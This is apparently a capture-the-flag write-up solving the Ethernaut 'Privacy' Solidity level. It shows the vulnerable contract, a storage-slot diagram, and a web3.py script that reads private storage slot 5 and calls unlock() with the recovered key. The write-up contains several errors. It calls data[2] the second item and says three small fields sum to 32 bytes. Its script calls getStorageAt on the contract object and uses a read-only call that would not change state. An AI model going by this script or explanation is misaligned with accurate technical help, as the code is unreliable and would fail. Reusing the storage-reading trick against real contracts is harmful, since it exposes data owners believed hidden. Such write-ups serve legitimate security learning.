# Privacy

first we are presented with a nice description and a "might help" as well:

```The creator of this contract was careful enough to protect the sensitive areas of its storage.

Unlock this contract to beat the level.

Things that might help:

Understanding how storage works
Understanding how parameter parsing works
Understanding how casting works
```

And then code:

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```
Looking at the code we discover this eye catching function :

```solidity
 function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }
  ```
  
  it requires that we pass a "_key" value that matches whatever value is present at the second item in an array named "data".
  
  I have made a little illustration on the memory blocks of the code where all variables are stored
```
   ______________________
  | bool public locked   | _______{32 bytes = slot 0}
  |----------------------|
  | uint256 public ID    | _______{32 bytes = slot 1}
  |----------------------|
  | uint 8               | 
  | uint 8               | _______{sums up to 32 bytes = slot 2}        
  | uint 16              |
  |----------------------|
  | data[0]              | _______{32 bytes = slot 3}
  |----------------------|
  | data[1]              | _______{32 bytes = slot 4}
  |----------------------|
  | data[2]              | _______{32 bytes = slot 5}
  |______________________|
```
we know from our src that we are intrested in slot5.
using web3.py to solve this:
```python
from web3 import Web3

#setup our node
INFURA = "our_choice_of_node"
web3 = Web3(Web3.HTTPProvider(INFURA))

#setup our contract
target_address = '0xab3410.....'
abi = 'abi' #you can always copy from remix
target = web3.eth.contract(address=target_address,abi=abi)

#do stuff
print(target.getStorageAt(target_address,5))
#we then convert our output to the required type for our unlock() function. i.e bytes 16.i just used an online converter :p
key = 0x37bf84...
target.functions.unlock(key).call()
```
That should be that for this challange .To verify ,call `locked()` which should return false.
